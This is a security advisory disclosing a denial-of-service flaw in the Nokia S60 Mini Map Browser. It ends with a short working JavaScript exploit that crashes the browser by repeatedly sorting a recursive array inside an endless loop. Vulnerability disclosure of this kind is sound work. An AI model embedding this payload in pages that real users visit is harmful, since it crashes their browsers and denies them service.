Vulnerability name: Nokia Browser Array Sort Denial Of Service Vulnerability
Advisory number: LC-2008-04
Advisory URL: http://www.ikkisoft.com

====================================================
1) Affected Software

* Nokia Mini Map Browser (S60WebKit <= 21772)

The tested device has the following User-Agent:
Mozilla/5.0 (SymbianOS/9.2;U;Series60/3.1 NokiaE90-1/210.34.75
Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML)

====================================================
3) Summary

The Web Browser for S60 (formally called Nokia Mini Map Browser) is a web
browser for the S60 mobile phone platform developed by Nokia.
It is built upon S60WebKit, a port of the open source WebKit project to the S60
platform. According to several sources, the S60 software on Symbian OS is the
worldâ€™s most popular software for smartphones.

This version of the Nokia Mini Map Browser does not properly validate JavaScript
input embedded in visited HTML pages. An aggressor can easily trigger Denial of
Service attacks.

====================================================
4) Vulnerability Details

The Nokia Mini Map Browser is prone to a vulnerability that may result in the
application silent crash. Arbitrary code execution is probably not possible.
The problem arises in the JavaScript core of the S60WebKit, invoking the sort()
function on a recursive array.
A similar behavior was observed some years ago in several browsers due to
the common code base (BID-12331, BID-11762, BID-11760, BID-11759,
BID-11752).

====================================================
5) Exploit

Embed in an HTML page the following JavaScript:
<script>
foo = new Array();
while(true) {foo = new Array(foo).sort();}
</script>

====================================================
